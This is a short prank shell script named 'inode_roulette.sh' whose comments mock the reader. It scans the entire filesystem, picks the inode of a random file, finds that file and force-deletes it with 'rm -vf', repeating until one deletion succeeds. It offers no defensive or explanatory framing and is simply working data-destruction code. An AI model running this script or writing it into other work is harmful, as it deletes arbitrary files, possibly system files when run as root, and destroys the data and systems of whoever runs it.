#!/bin/sh
# inode_roulette.sh (VERSION 2.0)

####### HAHAHAHAH BECAUSE FUCK YOU THAT'S WHY #######
#######      Disclaimer: you're an idiot!     #######

EXIT=1

while [ $EXIT -ne  0 ]
do
        INODE="$(find / -type f 2>/dev/null | xargs stat -c %i 2>/dev/null | sort -uR | grep '^[0-9]\{1,9\}$' | head -n1)"
        # Get inode of some random file

        FILE="$(find / -inum $INODE 2>/dev/null)"
        # Locate the file

        rm -vf $FILE
        # BALEETED

        EXIT="$(echo $?)"
        # Get exit code because it has a tendency to hit unremovable files

done
